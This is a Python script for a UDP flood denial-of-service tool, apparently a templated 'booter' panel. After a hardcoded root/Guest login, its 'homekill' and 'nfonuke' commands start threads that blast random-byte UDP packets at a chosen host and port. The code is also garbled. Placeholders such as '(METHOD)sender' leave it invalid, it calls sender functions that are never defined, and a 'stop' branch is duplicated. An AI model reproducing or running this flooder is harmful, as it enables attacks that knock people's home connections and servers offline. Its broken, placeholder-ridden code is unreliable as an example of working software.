#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

updatenotes = """\033[91m
╔══════════════════════════════════════════════════════╗
║                     \033[00mUpdate Notes\033[91m                     ║
║══════════════════════════════════════════════════════║
║ \033[00m[+] Timeout Bug Fixed.\033[91m                               ║
║ \033[00m[+] methods ovh will be down for some time .\033[91m                             ║
║ \033[00m[+] User And Pass Changed To what u wanted.\033[91m                 ║
║ \033[00m[+] yooooo idk.\033[91m    ║
║ \033[00m[+] All Tools Fixed And Working.\033[91m                     ║
╚══════════════════════════════════════════════════════╝\033[00m
"""

banner = """
                                    
                        welcome to (NAME) {test}
              this is NOT real (NAME) just 1 method
      ╔══════════════════════════════════════════════════════╗
      ║   homekill {ip} {port} {time-it dont matter} {65500} ║ 
      ╚══════════════════════════════════════════════════════╝                                     
"""

cookie = open(".(NAME)_Cookie","w+")

fsubs = True
liips = True
tattacks = True
uaid = True
said = True
iaid = True
haid = True
aid = True
attack = True
udp = True
homekill = True                                                


def (METHOD)sender(host, port, timer, punch):
	global uaid
	global ddosgaurd
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 10000000
	aid += 10000000
	tattacks += 10000000
	while time.time() < timeout and (METHOD) and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 10000000
	aid -= 10000000



def main():
	global fsubs
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global ovh
	global gamenuke
	global http

	while True:
		sys.stdout.write("\x1b]2;(NAME) servers {78} Online {34} {130 fucking gigs} \x07")
		sin = input("\033[1;00m[\033[91mNAME\033[1;00m]-\033[91m家\033[00m ").lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		elif sinput == "exit":
			print ("[\033[91m(NAME)\033[00m] You Are Exiting Out Of (NAME) come back.\n")
			exit()
		elif sinput == "attacks":
			print ("[\033[91mholy fuck you have been frying shit\033[00m] Total Attacks Running: {}\n".format (aid))
			main()
		elif sinput == "resolve":
			liips += 1
			host = sin.split(" ")[1]
			host_ip = socket.gethostbyname(host)
			print ("[\033[91mDIE\033[00m] Host: {} \033[00m[\033[91mConverted\033[00m] {}\n".format (host, host_ip))
			main()
		elif sinput == "nfonuke":
			if username == "Guest":
				print ("[\033[91mDIE\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mDIE\033[00m] Attack Sent From (NAME): {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=nfonukesender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mDIE\033[00m] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mDIE\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "homekill":
			if username == "Guest":
				print ("[\033[91mDIE\033[00m] You Are Not Allowed To Use This Method.\n")
				main()
			else:
				try:
					sinput, host, port, timer, pack = sin.split(" ")
					socket.gethostbyname(host)
					print ("[\033[91mDIE\033[00m] Attack Sent From (NAME): {}\n".format (host))
					punch = random._urandom(int(pack))
					threading.Thread(target=homekillsender, args=(host, port, timer, punch)).start()
				except ValueError:
					print ("[\033[91mDIE\033[00m] The Command {} Requires An Argument.\n".format (sinput))
					main()
				except socket.gaierror:
					print ("[\033[91mDIE\033[00m] Host: {} Invalid.\n".format (host))
					main()
		elif sinput == "stop":
			print ("[\033[91mDIE\033[00m] All Running Attacks Have Been Stopped.\n")
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			what = sin.split(" ")[1]
			if what == "udp":
				print ("Stopping All homekill Attacks.\n")
				homekill = False
				while not udp:
					if aid == 0:
						print ("[\033[91mDIE\033[00m] No homekill Processes Running.")
						homekill = True
						main()
			if what == "ovh":
				print ("Stopping All ovhdown Attacks.\n")
				icmp = False
				while not ovh:
					print ("[\033[91mDIE\033[00m] No ovh Processes Running.")
					udp = True
					main()
		else:
			print ("[\033[91mDIE\033[00m] {} Is Not A Command.\n".format(sinput))
			main()



try:
	users = "root"
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, Dick face its {root}.\n")
		exit()
except KeyboardInterrupt:
	exit()
try:
	passwords = ["root", "Guest"]
	password = getpass.getpass ("[+] Password: ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login Correct.")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Type Help To See Commands.")
			cookie.write("DIE")
			time.sleep(3)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mDIE\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Dick face its {root}.\n")
			exit()
	if user == "root":
		if password == passwords[1]:
			print ("[+] Login Correct.")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Loading (NAME).")
			print ("[+] Certain Methods Will Not Be Available To You.")
			print ("[+] Type Help To See Commands.")
			time.sleep(5)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\033[91mDIE\033[00m] Ctrl-C Has Been Pressed.\n")
				main()
		else:
			print ("[+] Incorrect, Exiting.\n")
			exit()
except KeyboardInterrupt:
	exit()